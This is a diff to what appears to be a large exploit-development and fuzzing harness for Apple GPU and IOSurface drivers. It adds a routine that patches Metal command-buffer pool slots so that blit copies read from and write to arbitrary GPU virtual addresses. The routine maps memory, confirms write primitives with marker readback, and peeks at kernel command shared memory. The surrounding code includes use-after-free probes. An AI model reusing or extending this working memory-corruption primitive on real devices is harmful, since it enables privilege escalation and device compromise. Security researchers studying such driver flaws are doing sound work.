@@ -14669,6 +14669,201 @@ static void p_mtpatch(void) {
     LOG("[mtpatch] done (alive)");
 }
 
+// V90: GPU VM map via patched-blit read primitive. Patch the copy SOURCE
+// (pool slots holding gpuAddress(A)) to a probe GPUVA X, commit, read back B.
+// Regions that once contained slots are cached so later probes scan ~MBs, not
+// the whole VM. Env: FUZZ_GPUVMSCAN=1, FUZZ_SCAN_SPACE=0xN (dense single-space
+// scan), FUZZ_SCAN_SKIP=N (resume after crash).
+static mach_vm_address_t g_sreg[24];
+static mach_vm_size_t g_sregsz[24];
+static int g_nsreg = -1;   // -1 = no full scan done yet
+
+static long gscan_patch(uint64_t from, uint64_t to) {
+    long n = 0;
+    if (g_nsreg < 0) {
+        // full VM walk, remember regions containing hits
+        g_nsreg = 0;
+        mach_vm_address_t addr = 0;
+        while (1) {
+            mach_vm_size_t sz = 0;
+            vm_region_basic_info_data_64_t info;
+            mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+            mach_port_t obj;
+            if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                               (vm_region_info_t)&info, &cnt, &obj)) break;
+            if ((info.protection & VM_PROT_WRITE) && sz >= 0x1000 && sz <= 0x4000000) {
+                uint8_t *base = (uint8_t *)addr;
+                int reg_has = 0;
+                for (mach_vm_size_t o = 0; o + 8 <= sz; o += 4) {
+                    if (*(uint64_t *)(base + o) == from) {
+                        *(uint64_t *)(base + o) = to;
+                        n++; reg_has = 1;
+                    }
+                }
+                if (reg_has && g_nsreg < 24) {
+                    g_sreg[g_nsreg] = addr;
+                    g_sregsz[g_nsreg] = sz;
+                    g_nsreg++;
+                }
+            }
+            addr += sz;
+            if (!sz) break;
+        }
+    } else {
+        for (int r = 0; r < g_nsreg; r++) {
+            uint8_t *base = (uint8_t *)g_sreg[r];
+            for (mach_vm_size_t o = 0; o + 8 <= g_sregsz[r]; o += 4)
+                if (*(uint64_t *)(base + o) == from) {
+                    *(uint64_t *)(base + o) = to;
+                    n++;
+                }
+        }
+    }
+    return n;
+}
+
+static void p_gpuvmscan(void) {
+    LOG("[gscan] v90: GPU VM scan via patched-blit read");
+    const char *sp = getenv("FUZZ_SCAN_SPACE");
+    const char *sk = getenv("FUZZ_SCAN_SKIP");
+    long skip = sk ? atol(sk) : 0;
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[gscan] no device"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+    if (!mq || !bufA || !bufB) { LOG("[gscan] alloc fail"); return; }
+    memset([bufA contents], 0x41, 0x10000);
+    uint64_t gpuA = [bufA gpuAddress];
+    uint64_t gpuB = [bufB gpuAddress];
+    LOG("[gscan] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
+
+    static uint64_t hits[24];
+    static int nhit;
+    static long pidx;
+    nhit = 0; pidx = 0;
+
+    // one read probe: X -> bufB. Returns 1 if X looked mapped-with-data.
+    int (^probe)(uint64_t, const char *) = ^int(uint64_t x, const char *tag) {
+        pidx++;
+        if (pidx <= skip) return 0;
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+        [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+        [enc endEncoding];
+        long np = gscan_patch(gpuA, x);
+        memset([bufB contents], 0, 0x10000);
+        @try {
+            [cb commit];
+            [cb waitUntilCompleted];
+        } @catch (NSException *ex) {
+            LOG("[gscan] #%ld X 0x%llx EXCEPTION %s", pidx, x, [[ex name] UTF8String]);
+            return 0;
+        }
+        uint8_t *bb = (uint8_t *)[bufB contents];
+        long nz = 0, a41 = 0;
+        for (long i = 0; i < 0x10000; i++) { if (bb[i]) nz++; if (bb[i] == 0x41) a41++; }
+        int data = (np > 0 && nz > 0 && a41 < 0x8000);
+        LOG("[gscan] #%ld X 0x%llx (%s) -> slots %ld | B nz %ld 41 %ld %s",
+            pidx, x, tag, np, nz, a41,
+            np == 0 ? "NOPATCH!" : data ? "DATA-HIT" : (nz == 0 ? "unmapped/zero" : "A-passthrough?"));
+        if (data) {
+            mtl_hexdump("DATA", x, bb, 0x40);
+            if (nhit < 24) hits[nhit++] = x;
+        }
+        return data;
+    };
+
+    // 1. calibration
+    probe(gpuA, "calib-self");              // expect A-passthrough (0x41)
+    probe(0x1deadbeef0000ULL, "calib-unmapped");  // unmapped signature
+    // 2. internal pool refs from this run's kcmd shmem
+    {
+        id<MTLCommandBuffer> cb0 = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> e0 = [cb0 blitCommandEncoder];
+        [e0 copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+        [e0 endEncoding];
+        void *st0 = find_ivar_obj(cb0, "torage", 0, "cb");
+        uint64_t kva0 = st0 ? *(uint64_t *)((uint8_t *)st0 + 0x28) : 0;
+        if (kva0) {
+            uint64_t seen[16]; int ns = 0;
+            for (long o = 0; o < 0x1000 - 8 && ns < 16; o += 4) {
+                uint64_t q = *(uint64_t *)((uint8_t *)(uintptr_t)kva0 + o);
+                if ((q >> 32) == 0x100) {
+                    int dup = 0;
+                    for (int k = 0; k < ns; k++) if ((seen[k] & ~0xffffULL) == (q & ~0xffffULL)) dup = 1;
+                    if (!dup) seen[ns++] = q;
+                }
+            }
+            for (int k = 0; k < ns; k++) probe(seen[k], "kcmd-internal");
+        }
+        // this cb is never committed; fine (encode only)
+    }
+    if (sp) {
+        // dense single-space scan: 0x400000 bytes, 0x4000 step
+        uint64_t base = strtoull(sp, NULL, 0) << 32;
+        for (uint64_t off = 0; off < 0x400000; off += 0x4000)
+            probe(base + off, "space-dense");
+    } else {
+        // 3. low 0x1-space
+        for (uint64_t a = 0x10000000000ULL; a < 0x10000100000ULL; a += 0x4000)
+            probe(a, "low-0x1");
+        // 4. around our buffers
+        for (uint64_t a = (gpuA & ~0x3fffULL) - 0x40000; a < gpuB + 0x80000; a += 0x8000)
+            probe(a, "near-bufs");
+        // 5. space 0x0
+        for (uint64_t a = 0; a < 0x400000; a += 0x40000)
+            probe(a, "space-0x0");
+        // 6. high spaces, a few probes each
+        static const uint64_t spaces[] = { 0x2, 0x4, 0x8, 0x10, 0x40, 0x100 };
+        for (unsigned s = 0; s < sizeof(spaces)/sizeof(spaces[0]); s++)
+            for (uint64_t off = 0; off <= 0x8000; off += 0x4000)
+                probe((spaces[s] << 32) + off, "space-high");
+    }
+    LOG("[gscan] scan done: %ld probes, %d data hits", pidx - skip, nhit);
+
+    // 7. write-probes on the most interesting hits: marker -> X, then read X back
+    for (int h = 0; h < nhit && h < 8; h++) {
+        uint64_t x = hits[h];
+        uint64_t *ap = (uint64_t *)[bufA contents];
+        for (int i = 0; i < 0x10000 / 8; i++) ap[i] = 0xdeadbeefcafe0000ULL | (uint64_t)h;
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+        [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+        [enc endEncoding];
+        long np = gscan_patch(gpuB, x);   // dest slots -> X
+        @try {
+            [cb commit];
+            [cb waitUntilCompleted];
+        } @catch (NSException *ex) {
+            LOG("[gscan] write-probe X 0x%llx EXCEPTION %s", x, [[ex name] UTF8String]);
+            continue;
+        }
+        LOG("[gscan] write-probe X 0x%llx: dest slots patched %ld, committed", x, np);
+        // read back X into bufB
+        memset([bufA contents], 0x41, 0x10000);
+        id<MTLCommandBuffer> cb2 = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc2 = [cb2 blitCommandEncoder];
+        [enc2 copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+        [enc2 endEncoding];
+        gscan_patch(gpuA, x);
+        memset([bufB contents], 0, 0x10000);
+        @try {
+            [cb2 commit];
+            [cb2 waitUntilCompleted];
+        } @catch (NSException *ex) {
+            LOG("[gscan] write-probe readback X 0x%llx EXCEPTION", x);
+            continue;
+        }
+        uint64_t *bp = (uint64_t *)[bufB contents];
+        int marker = 0;
+        for (int i = 0; i < 0x10000 / 8; i++) if ((bp[i] & 0xffffffffff00ULL) == (0xdeadbeefcafe0000ULL | (uint64_t)h)) marker++;
+        LOG("[gscan] write-probe X 0x%llx -> readback marker qwords %d/8192 %s",
+            x, marker, marker > 4000 ? "*** WRITE-PROBE CONFIRMED ***" : "(no)");
+    }
+    LOG("[gscan] done (alive)");
+}
+
 static void p4b_uaf2(void) {
     LOG("[v13-d] UAF destroy-first (panic tolerated)");
     IOSurfaceRef big1 = make_surface(2048, 2048);
@@ -14799,6 +14994,7 @@ void *t_iosurface_scaler(void *arg) {
     static int probed = 0;
     if (!probed) {
         probed = 1;
+        if (getenv("FUZZ_GPUVMSCAN")) { p_gpuvmscan(); LOG("[probe13] gpuvmscan-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTPATCH")) { p_mtpatch(); LOG("[probe13] mtpatch-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CONNPROBE")) { p_connprobe(); LOG("[probe13] connprobe-only mode, stop"); return NULL; }
